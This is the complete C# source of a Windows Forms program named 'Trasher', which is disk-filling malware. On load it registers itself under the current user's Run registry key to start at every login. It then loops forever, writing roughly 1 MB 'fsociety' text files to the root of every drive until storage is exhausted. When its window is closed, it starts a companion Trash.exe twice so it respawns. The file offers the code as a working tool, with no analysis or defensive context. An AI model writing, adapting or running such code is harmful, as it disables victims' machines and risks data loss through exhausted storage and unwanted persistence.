using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Trasher
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Add_ToStarup()
        {
            const string applicationName = "Trasher.exe";
            const string pathRegistryKeyStartup =
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            using (RegistryKey registryKeyStartup = Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
            {
                registryKeyStartup.SetValue(
                    applicationName,
                    string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Add_ToStarup();
            DriveInfo[] dis = DriveInfo.GetDrives();
            int n = 0;
            while (true)
            {
                foreach (DriveInfo d in dis)
                {
                    try
                    {
                        string name = "fsociety" + Convert.ToString(n) + ".txt";
                        StreamWriter sw = new StreamWriter(d.ToString() + name);
                        for (int i = 0; i < 131072; i++)
                        {
                            sw.Write("fsociety");
                        }
                        sw.Close();
                    } catch { continue; }
                }
                n++;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.Start(Environment.CurrentDirectory + @"\Trash.exe");
            Process.Start(Environment.CurrentDirectory + @"\Trash.exe");
        }
    }
}
